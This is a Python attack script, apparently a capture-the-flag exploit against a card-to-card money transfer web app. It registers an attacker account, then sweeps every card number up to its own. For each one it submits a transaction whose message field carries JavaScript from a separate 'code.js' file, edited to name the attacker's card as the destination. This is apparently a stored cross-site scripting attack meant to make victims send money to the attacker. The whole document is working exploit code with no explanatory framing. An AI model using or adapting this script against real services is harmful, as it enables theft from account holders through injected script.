#!/usr/bin/env python
import requests
import sys
import os
import logging
from const import *
logging.basicConfig()
log = logging.getLogger(__file__)
log.setLevel(logging.DEBUG)

def reg_user(uname, pw):
  r = s.post(BASE_URL + "/register", data={ 'username' : uname, 'password' : pw })
  if r.status_code != 200:
    log.error("error registering user")
    return None

def login_user(uname, pw):
  r = s.post(BASE_URL + "/login", data={ 'username' : uname, 'password' : pw })
  if r.status_code != 200:
    log.error("error logging in user")
    return None

def reg_card():
  r = s.post(BASE_URL + "/index/cardRegister", data={ 'register' : 'true' })

  if r.status_code != 200:
    log.error("error registering card")
    return None

  return r.json()['card_number']

def submit_transaction(amount, from_card, to_card, message):
  data = {
    'amount' : amount,
    'from_card' : from_card,
    'to_card' : to_card,
    'message' : message
  }
  r = s.post(BASE_URL + "/card2card/submit", data=data)
  if r.status_code != 200:
    log.error("error submitting transaction")

def exploit(target_card, own_card):
  fl = open('code.js', 'r')
  code = fl.read().replace('INSERT_DEST_CARD_HERE', str(own_card))
  submit_transaction(1, own_card, target_card, code)

def main():
  uname = 'hackerzzz'
  pw = '123456'
  reg_user(uname, pw)
  login_user(uname, pw)
  card = reg_card()
  
  for i in range(1337000000000000, int(card)):
    exploit(i, card)

if __name__=="__main__":
  s = requests.session()
  main()
